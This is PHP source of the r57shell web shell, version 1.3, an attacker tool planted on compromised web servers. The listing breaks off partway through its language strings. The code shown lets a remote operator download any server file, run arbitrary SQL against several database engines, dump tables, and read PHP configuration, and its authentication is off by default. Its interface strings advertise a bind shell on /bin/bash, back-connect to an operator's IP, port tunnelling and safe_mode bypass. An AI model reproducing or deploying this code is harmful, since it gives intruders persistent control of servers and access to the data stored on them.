<?php

//Created using ArabianAttacker Website's Hacking Tool Kit
//WwW.TM-WORLD.NeT
//WwW.TM-WORLD.NeT/ArabianAttacker/

/******************************************************************************************************/
/*
/*                                     #    #        #    #
/*                                     #   #          #   #
/*                                    #    #          #    #
/*                                    #   ##   ####   ##   #
/*                                   ##   ##  ######  ##   ##
/*                                   ##   ##  ######  ##   ##
/*                                   ##   ##   ####   ##   ##
/*                                   ###   ############   ###
/*                                   ########################
/*                                        ##############
/*                                 ######## ########## #######
/*                                ###   ##  ##########  ##   ###
/*                                ###   ##  ##########  ##   ###
/*                                 ###   #  ##########  #   ###
/*                                 ###   ##  ########  ##   ###
/*                                  ##    #   ######   #    ##
/*                                   ##   #    ####   #    ##
/*                                     ##                 ##
/*
/*
/*
/*  r57shell.php - ñêðèïò íà ïõï ïîçâîëÿþùèé âàì âûïîëíÿòü ñèñòåìíûå êîìàíäû íà ñåðâåðå ÷åðåç áðàóçåð
/*  Âû ìîæåòå ñêà÷àòü íîâóþ âåðñèþ íà íàøåì ñàéòå: http://rst.void.ru
/*  Âåðñèÿ: 1.3 (05.03.2006)
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
/*  Îòäåëüíàÿ áëàãîäàðíîñòü çà ïîìîùü è èäåè: blf, phoenix, virus, NorD è âñåì ÷åðòÿì èç RST/GHC.
/*  Åñëè ó Âàñ åñòü êàêèå-ëèáî èäåè ïî ïîâîäó òîãî êàêèå ôóíêöèè ñëåäóåò äîáàâèòü â ñêðèïò òî ïèøèòå
/*  íà rst@void.ru. Âñå ïðåäëîæåíèÿ áóäóò ðàññìîòðåíû.
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
/*  (c)oded by 1dt.w0lf
/*  RST/GHC http://rst.void.ru , http://ghc.ru
/*  ANY MODIFIED REPUBLISHING IS RESTRICTED
/******************************************************************************************************/
/* ~~~ Íàñòðîéêè | Options  ~~~ */

// Âûáîð ÿçûêà | Language
// $language='ru' - ðóññêèé (russian)
// $language='eng' - english (àíãëèéñêèé)
$language='ru';

// Àóòåíòèôèêàöèÿ | Authentification
// $auth = 1; - Àóòåíòèôèêàöèÿ âêëþ÷åíà  ( authentification = On  )
// $auth = 0; - Àóòåíòèôèêàöèÿ âûêëþ÷åíà ( authentification = Off )
$auth = 0;

// Ëîãèí è ïàðîëü äëÿ äîñòóïà ê ñêðèïòó (Login & Password for access)
// ÍÅ ÇÀÁÓÄÜÒÅ ÑÌÅÍÈÒÜ ÏÅÐÅÄ ÐÀÇÌÅÙÅÍÈÅÌ ÍÀ ÑÅÐÂÅÐÅ!!! (CHANGE THIS!!!)
// Ëîãèí è ïàðîëü øèôðóþòñÿ ñ ïîìîùüþ àëãîðèòìà md5, çíà÷åíèÿ ïî óìîë÷àíèþ 'r57'
// Login & password crypted with md5, default is 'r57'
$name='ec371748dc2da624b35a4f8f685dd122'; // ëîãèí ïîëüçîâàòåëÿ  (user login)
$pass='ec371748dc2da624b35a4f8f685dd122'; // ïàðîëü ïîëüçîâàòåëÿ (user password)
/******************************************************************************************************/
error_reporting(0);
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$safe_mode = @ini_get('safe_mode');
$version = "1.3";
if(version_compare(phpversion(), '4.1.0') == -1)
 {
 $_POST   = &$HTTP_POST_VARS;
 $_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 }
if (@get_magic_quotes_gpc())
 {
 foreach ($_POST as $k=>$v)
  {
  $_POST[$k] = stripslashes($v);
  }
 foreach ($_SERVER as $k=>$v)
  {
  $_SERVER[$k] = stripslashes($v);
  }
 }

if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="r57shell"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b><a href=http://rst.void.ru>r57shell</a> : Access Denied</b>");
   }
}
$head = '<!-- Çäðàâñòâóé  Âàñÿ -->
<html>
<head>
<title>r57shell</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">

<STYLE>
tr {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
td {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
.table1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP:    #cccccc 0px;
BORDER-LEFT:   #cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
BACKGROUND-COLOR: #D4D0C8;
}
.td1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP:    #cccccc 0px;
BORDER-LEFT:   #cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
font: 7pt Verdana;
}
.tr1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP:    #cccccc 0px;
BORDER-LEFT:   #cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
}
table {
BORDER-RIGHT:  #eeeeee 1px outset;
BORDER-TOP:    #eeeeee 1px outset;
BORDER-LEFT:   #eeeeee 1px outset;
BORDER-BOTTOM: #eeeeee 1px outset;
BACKGROUND-COLOR: #D4D0C8;
}
input {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
select {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
submit {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP:    buttonhighlight 2px outset;
BORDER-LEFT:   buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
BACKGROUND-COLOR: #e4e0d8;
width: 30%;
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: Fixedsys bold;
}
BODY {
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
</STYLE>';
class zipfile
{
    var $datasec      = array();
    var $ctrl_dir     = array();
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    var $old_offset   = 0;
    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        }
        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
                ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }
    function addFile($data, $name, $time = 0)
    {
        $name     = str_replace('\\', '/', $name);
        $dtime    = dechex($this->unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr   = "\x50\x4b\x03\x04";
        $fr   .= "\x14\x00";
        $fr   .= "\x00\x00";
        $fr   .= "\x08\x00";
        $fr   .= $hexdtime;
        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len   = strlen($zdata);
        $fr      .= pack('V', $crc);
        $fr      .= pack('V', $c_len);
        $fr      .= pack('V', $unc_len);
        $fr      .= pack('v', strlen($name));
        $fr      .= pack('v', 0);
        $fr      .= $name;
        $fr .= $zdata;
        $this -> datasec[] = $fr;
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x14\x00";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x08\x00";
        $cdrec .= $hexdtime;
        $cdrec .= pack('V', $crc);
        $cdrec .= pack('V', $c_len);
        $cdrec .= pack('V', $unc_len);
        $cdrec .= pack('v', strlen($name) );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('V', 32 );
        $cdrec .= pack('V', $this -> old_offset );
        $this -> old_offset += strlen($fr);
        $cdrec .= $name;
        $this -> ctrl_dir[] = $cdrec;
    }
    function file()
    {
        $data    = implode('', $this -> datasec);
        $ctrldir = implode('', $this -> ctrl_dir);
        return
            $data .
            $ctrldir .
            $this -> eof_ctrl_dir .
            pack('v', sizeof($this -> ctrl_dir)) .
            pack('v', sizeof($this -> ctrl_dir)) .
            pack('V', strlen($ctrldir)) .
            pack('V', strlen($data)) .
            "\x00\x00";
    }
}
function compress(&$filename,&$filedump,$compress)
 {
    global $content_encoding;
    global $mime_type;
    if ($compress == 'bzip' && @function_exists('bzcompress'))
     {
        $filename  .= '.bz2';
        $mime_type = 'application/x-bzip2';
        $filedump = bzcompress($filedump);
     }
     else if ($compress == 'gzip' && @function_exists('gzencode'))
     {
        $filename  .= '.gz';
        $content_encoding = 'x-gzip';
        $mime_type = 'application/x-gzip';
        $filedump = gzencode($filedump);
     }
     else if ($compress == 'zip' && @function_exists('gzcompress'))
     {
     	$filename .= '.zip';
        $mime_type = 'application/zip';
        $zipfile = new zipfile();
        $zipfile -> addFile($filedump, substr($filename, 0, -4));
        $filedump = $zipfile -> file();
     }
     else
     {
     	$mime_type = 'application/octet-stream';
     }
 }
function mailattach($to,$from,$subj,$attach)
 {
 $headers  = "From: $from\r\n";
 $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: ".$attach['type'];
 $headers .= "; name=\"".$attach['name']."\"\r\n";
 $headers .= "Content-Transfer-Encoding: base64\r\n\r\n";
 $headers .= chunk_split(base64_encode($attach['content']))."\r\n";
 if(@mail($to,$subj,"",$headers)) { return 1; }
 return 0;
 }
class my_sql
 {
 var $host = 'localhost';
 var $port = '';
 var $user = '';
 var $pass = '';
 var $base = '';
 var $db   = '';
 var $connection;
 var $res;
 var $error;
 var $rows;
 var $columns;
 var $num_rows;
 var $num_fields;
 var $dump;

 function connect()
  {
  	switch($this->db)
     {
  	 case 'MySQL':
  	  if(empty($this->port)) { $this->port = '3306'; }
  	  if(!function_exists('mysql_connect')) return 0;
  	  $this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass);
  	  if(is_resource($this->connection)) return 1;
  	 break;
     case 'MSSQL':
      if(empty($this->port)) { $this->port = '1433'; }
  	  if(!function_exists('mssql_connect')) return 0;
  	  $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass);
      if($this->connection) return 1;
     break;
     case 'PostgreSQL':
      if(empty($this->port)) { $this->port = '5432'; }
      $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'";
      if(!function_exists('pg_connect')) return 0;
      $this->connection = @pg_connect($str);
      if(is_resource($this->connection)) return 1;
     break;
     case 'Oracle':
      if(!function_exists('ocilogon')) return 0;
      $this->connection = @ocilogon($this->user, $this->pass, $this->base);
      if(is_resource($this->connection)) return 1;
     break;
     }
    return 0;
  }

 function select_db()
  {
   switch($this->db)
    {
  	case 'MySQL':
  	 if(@mysql_select_db($this->base,$this->connection)) return 1;
    break;
    case 'MSSQL':
  	 if(@mssql_select_db($this->base,$this->connection)) return 1;
    break;
    case 'PostgreSQL':
     return 1;
    break;
    case 'Oracle':
     return 1;
    break;
    }
   return 0;
  }

 function query($query)
  {
   $this->res=$this->error='';
   switch($this->db)
    {
  	case 'MySQL':
     if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection)))
      {
      $this->error = @mysql_error($this->connection);
      return 0;
      }
     else if(is_resource($this->res)) { return 1; }
     return 2;
  	break;
    case 'MSSQL':
     if(false===($this->res=@mssql_query($query,$this->connection)))
      {
      $this->error = 'Query error';
      return 0;
      }
      else if(@mssql_num_rows($this->res) > 0) { return 1; }
     return 2;
    break;
    case 'PostgreSQL':
     if(false===($this->res=@pg_query($this->connection,$query)))
      {
      $this->error = @pg_last_error($this->connection);
      return 0;
      }
      else if(@pg_num_rows($this->res) > 0) { return 1; }
     return 2;
    break;
    case 'Oracle':
     if(false===($this->res=@ociparse($this->connection,$query)))
      {
      $this->error = 'Query parse error';
      }
     else
      {
      if(@ociexecute($this->res))
       {
       if(@ocirowcount($this->res) != 0) return 2;
       return 1;
       }
      $error = @ocierror();
      $this->error=$error['message'];
      }
    break;
    }
  return 0;
  }
 function get_result()
  {
   $this->rows=array();
   $this->columns=array();
   $this->num_rows=$this->num_fields=0;
   switch($this->db)
    {
  	case 'MySQL':
  	 $this->num_rows=@mysql_num_rows($this->res);
  	 $this->num_fields=@mysql_num_fields($this->res);
  	 while(false !== ($this->rows[] = @mysql_fetch_assoc($this->res)));
  	 @mysql_free_result($this->res);
  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    case 'MSSQL':
  	 $this->num_rows=@mssql_num_rows($this->res);
  	 $this->num_fields=@mssql_num_fields($this->res);
  	 while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res)));
  	 @mssql_free_result($this->res);
  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;};
    break;
    case 'PostgreSQL':
  	 $this->num_rows=@pg_num_rows($this->res);
  	 $this->num_fields=@pg_num_fields($this->res);
  	 while(false !== ($this->rows[] = @pg_fetch_assoc($this->res)));
  	 @pg_free_result($this->res);
  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    case 'Oracle':
     $this->num_fields=@ocinumcols($this->res);
     while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++;
     @ocifreestatement($this->res);
     if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    }
   return 0;
  }
 function dump($table)
  {
   if(empty($table)) return 0;
   $this->dump=array();
   $this->dump[0] = '##';
   $this->dump[1] = '## --------------------------------------- ';
   $this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s");
   $this->dump[3] = '## Database: '.$this->base;
   $this->dump[4] = '##    Table: '.$table;
   $this->dump[5] = '## --------------------------------------- ';
   switch($this->db)
    {
  	case 'MySQL':
  	 $this->dump[0] = '## MySQL dump';
  	 if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;
  	 if(!$this->get_result()) return 0;
  	 $this->dump[] = $this->rows[0]['Create Table'];
     $this->dump[] = '## --------------------------------------- ';
  	 if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;
  	 if(!$this->get_result()) return 0;
  	 for($i=0;$i<$this->num_rows;$i++)
  	  {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @mysql_real_escape_string($v);}
  	  $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
  	  }
    break;
    case 'MSSQL':
     $this->dump[0] = '## MSSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
  	 if(!$this->get_result()) return 0;
  	 for($i=0;$i<$this->num_rows;$i++)
  	  {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
  	  $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
  	  }
    break;
    case 'PostgreSQL':
     $this->dump[0] = '## PostgreSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
  	 if(!$this->get_result()) return 0;
  	 for($i=0;$i<$this->num_rows;$i++)
  	  {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
  	  $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
  	  }
    break;
    case 'Oracle':
      $this->dump[0] = '## ORACLE dump';
      $this->dump[]  = '## under construction';
    break;
    default:
     return 0;
    break;
    }
   return 1;
  }
 function close()
  {
   switch($this->db)
    {
  	case 'MySQL':
  	 @mysql_close($this->connection);
    break;
    case 'MSSQL':
     @mssql_close($this->connection);
    break;
    case 'PostgreSQL':
     @pg_close($this->connection);
    break;
    case 'Oracle':
     @oci_close($this->connection);
    break;
    }
  }
 function affected_rows()
  {
   switch($this->db)
    {
  	case 'MySQL':
  	 return @mysql_affected_rows($this->res);
    break;
    case 'MSSQL':
     return @mssql_affected_rows($this->res);
    break;
    case 'PostgreSQL':
     return @pg_affected_rows($this->res);
    break;
    case 'Oracle':
     return @ocirowcount($this->res);
    break;
    default:
     return 0;
    break;
    }
  }
 }
if(isset($_GET['img'])&&!empty($_GET['img']))
 {
 $images = array();
 $images[1]='R0lGODlhBwAHAIAAAAAAAP///yH5BAEAAAEALAAAAAAHAAcAAAILjI9pkODnYohUhQIAOw==';
 $images[2]='R0lGODlhBwAHAIAAAAAAAP///yH5BAEAAAEALAAAAAAHAAcAAAILjI+pwA3hnmlJhgIAOw==';
 @ob_clean();
 header("Content-type: image/gif");
 echo base64_decode($images[$_GET['img']]);
 die();
 }
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name']))
 {
  if(!$file=@fopen($_POST['d_name'],"r")) { echo re($_POST['d_name']); $_POST['cmd']=""; }
  else
   {
    @ob_clean();
    $filename = @basename($_POST['d_name']);
    $filedump = @fread($file,@filesize($_POST['d_name']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    if (!empty($content_encoding)) { header('Content-Encoding: ' . $content_encoding); }
    header("Content-type: ".$mime_type);
    header("Content-disposition: attachment; filename=\"".$filename."\";");
    echo $filedump;
    exit();
   }
 }
if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
if ($_POST['cmd']=="db_query")
 {
 echo $head;
 $sql = new my_sql();
 $sql->db   = $_POST['db'];
 $sql->host = $_POST['db_server'];
 $sql->port = $_POST['db_port'];
 $sql->user = $_POST['mysql_l'];
 $sql->pass = $_POST['mysql_p'];
 $sql->base = $_POST['mysql_db'];
 $querys = @explode(';',$_POST['db_query']);

 if(!$sql->connect()) echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to SQL server</b></font></div>";
  else
   {
   if(!empty($sql->base)&&!$sql->select_db()) echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't select database</b></font></div>";
   else
    {
    foreach($querys as $num=>$query)
     {
      if(strlen($query)>5)
      {
      echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>";
      switch($sql->query($query))
       {
       case '0':
       echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>";
       break;
       case '1':
       if($sql->get_result())
        {
       	echo "<table width=100%>";
        foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES);
       	$keys = @implode("&nbsp;</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;", $sql->columns);
        echo "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
        for($i=0;$i<$sql->num_rows;$i++)
         {
         foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES);
         $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$sql->rows[$i]);
         echo '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>';
         }
        echo "</table>";
        }
       break;
       case '2':
       $ar = $sql->affected_rows()?($sql->affected_rows()):('0');
       echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>";
       break;
       }
      }
     }
    }
   }
 echo "<br><form name=form method=POST>";
 echo in('hidden','db',0,$_POST['db']);
 echo in('hidden','db_server',0,$_POST['db_server']);
 echo in('hidden','db_port',0,$_POST['db_port']);
 echo in('hidden','mysql_l',0,$_POST['mysql_l']);
 echo in('hidden','mysql_p',0,$_POST['mysql_p']);
 echo in('hidden','mysql_db',0,$_POST['mysql_db']);
 echo in('hidden','cmd',0,'db_query');
 echo "<div align=center><textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>";
 echo "</form>";
 echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
 }
if(isset($_GET['delete']))
 {
   @unlink(@substr(@strrchr($_SERVER['PHP_SELF'],"/"),1));
 }
if(isset($_GET['tmp']))
 {
   @unlink("/tmp/bdpl");
   @unlink("/tmp/back");
   @unlink("/tmp/bd");
   @unlink("/tmp/bd.c");
   @unlink("/tmp/dp");
   @unlink("/tmp/dpc");
   @unlink("/tmp/dpc.c");
 }
if(isset($_GET['phpini']))
{
echo $head;
function U_value($value)
 {
 if ($value == '') return '<i>no value</i>';
 if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
 if ($value === null) return 'NULL';
 if (@is_object($value)) $value = (array) $value;
 if (@is_array($value))
 {
 @ob_start();
 print_r($value);
 $value = @ob_get_contents();
 @ob_end_clean();
 }
 return U_wordwrap((string) $value);
 }
function U_wordwrap($str)
 {
 $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
 return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
 }
if (@function_exists('ini_get_all'))
 {
 $r = '';
 echo '<table width=100%>', '<tr><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Directive</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Local Value</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Master Value</b></div></font></td></tr>';
 foreach (@ini_get_all() as $key=>$value)
  {
  $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['local_value']).'</b></div></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['global_value']).'</b></div></font></td></tr>';
  }
 echo $r;
 echo '</table>';
 }
echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
die();
}
if(isset($_GET['cpu']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2 color=red><b>CPU</b></font></div></td></tr></table><table width=100%>';
   $cpuf = @file("cpuinfo");
   if($cpuf)
    {
      $c = @sizeof($cpuf);
      for($i=0;$i<$c;$i++)
        {
          $info = @explode(":",$cpuf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
if(isset($_GET['mem']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2 color=red><b>MEMORY</b></font></div></td></tr></table><table width=100%>';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i<$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
$lang=array(
'ru_text1' =>'Âûïîëíåííàÿ êîìàíäà',
'ru_text2' =>'Âûïîëíåíèå êîìàíä íà ñåðâåðå',
'ru_text3' =>'Âûïîëíèòü êîìàíäó',
'ru_text4' =>'Ðàáî÷àÿ äèðåêòîðèÿ',
'ru_text5' =>'Çàãðóçêà ôàéëîâ íà ñåðâåð',
'ru_text6' =>'Ëîêàëüíûé ôàéë',
'ru_text7' =>'Àëèàñû',
'ru_text8' =>'Âûáåðèòå àëèàñ',
'ru_butt1' =>'Âûïîëíèòü',
'ru_butt2' =>'Çàãðóçèòü',
'ru_text9' =>'Îòêðûòèå ïîðòà è ïðèâÿçêà åãî ê /bin/bash',
'ru_text10'=>'Îòêðûòü ïîðò',
'ru_text11'=>'Ïàðîëü äëÿ äîñòóïà',
'ru_butt3' =>'Îòêðûòü',
'ru_text12'=>'back-connect',
'ru_text13'=>'IP-àäðåñ',
'ru_text14'=>'Ïîðò',
'ru_butt4' =>'Âûïîëíèòü',
'ru_text15'=>'Çàãðóçêà ôàéëîâ ñ óäàëåííîãî ñåðâåðà',
'ru_text16'=>'Èñïîëüçîâàòü',
'ru_text17'=>'Óäàëåííûé ôàéë',
'ru_text18'=>'Ëîêàëüíûé ôàéë',
'ru_text19'=>'Exploits',
'ru_text20'=>'Èñïîëüçîâàòü',
'ru_text21'=>'Íîâîå èìÿ',
'ru_text22'=>'datapipe',
'ru_text23'=>'Ëîêàëüíûé ïîðò',
'ru_text24'=>'Óäàëåííûé õîñò',
'ru_text25'=>'Óäàëåííûé ïîðò',
'ru_text26'=>'Èñïîëüçîâàòü',
'ru_butt5' =>'Çàïóñòèòü',
'ru_text28'=>'Ðàáîòà â safe_mode',
'ru_text29'=>'Äîñòóï çàïðåùåí',
'ru_butt6' =>'Ñìåíèòü',
'ru_text30'=>'Ïðîñìîòð ôàéëà',
'ru_butt7' =>'Âûâåñòè',
'ru_text31'=>'Ôàéë íå íàéäåí',
'ru_text32'=>'Âûïîëíåíèå PHP êîäà',
'ru_text33'=>'Ïðîâåðêà âîçìîæíîñòè îáõîäà îãðàíè÷åíèé open_basedir ÷åðåç ôóíêöèè cURL',
'ru_butt8' =>'Ïðîâåðèòü',
'ru_text34'=>'Ïðîâåðêà âîçìîæíîñòè îáõîäà îãðàíè÷åíèé safe_mode ÷åðåç ôóíêöèþ include',
'ru_text35'=>'Ïðîâåðêà âîçìîæíîñòè îáõîäà îãðàíè÷åíèé safe_mode ÷åðåç çàãðóçêó ôàéëà â mysql',
'ru_text36'=>'Áàçà . Òàáëèöà',
'ru_text37'=>'Ëîãèí',
'ru_text38'=>'Ïàðîëü',
'ru_text39'=>'Áàçà',
'ru_text40'=>'Äàìï òàáëèöû áàçû äàííûõ',
'ru_butt9' =>'Äàìï',
'ru_text41'=>'Ñîõðàíèòü â ôàéëå',
'ru_text42'=>'Ðåäàêòèðîâàíèå ôàéëà',
'ru_text43'=>'Ðåäàêòèðîâàòü ôàéë',
'ru_butt10'=>'Ñîõðàíèòü',
'ru_butt11'=>'Ðåäàêòèðîâàòü',
'ru_text44'=>'Ðåäàêòèðîâàíèå ôàéëà íåâîçìîæíî! Äîñòóï òîëüêî äëÿ ÷òåíèÿ!',
'ru_text45'=>'Ôàéë ñîõðàíåí',
'ru_text46'=>'Ïðîñìîòð phpinfo()',
'ru_text47'=>'Ïðîñìîòð íàñòðîåê php.ini',
'ru_text48'=>'Óäàëåíèå âðåìåííûõ ôàéëîâ',
'ru_text49'=>'Óäàëåíèå ñêðèïòà ñ ñåðâåðà',
'ru_text50'=>'Èíôîðìàöèÿ î ïðîöåññîðå',
'ru_text51'=>'Èíôîðìàöèÿ î ïàìÿòè',
'ru_text52'=>'Òåêñò äëÿ ïîèñêà',
'ru_text53'=>'Èñêàòü â ïàïêå',
'ru_text54'=>'Ïîèñê òåêñòà â ôàéëàõ',
'ru_butt12'=>'Íàéòè',
'ru_text55'=>'Òîëüêî â ôàéëàõ',
